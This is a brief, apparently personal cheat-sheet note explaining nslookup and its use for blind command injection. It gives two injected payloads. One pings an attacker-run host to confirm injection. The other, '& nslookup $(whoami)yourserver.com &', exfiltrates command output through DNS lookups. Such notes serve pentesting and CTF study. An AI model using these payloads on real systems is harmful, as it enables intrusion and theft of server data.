
---
`nslookup` (Name Server Lookup) : Searching DNS(Domain Name System), when you enter a  URL, it will help you fin the corresponding IP address, vise versa.

When a web won't return the respond, wouldn't let you write files or using `ping` , try

```bash
& nslookup yourserver.com &
```

If you're site get a searching request from the target server, it works.

```bash
& nslookup $(whoami)yourserver.com &
```

Assume that www-data is the data attacker want to steal.

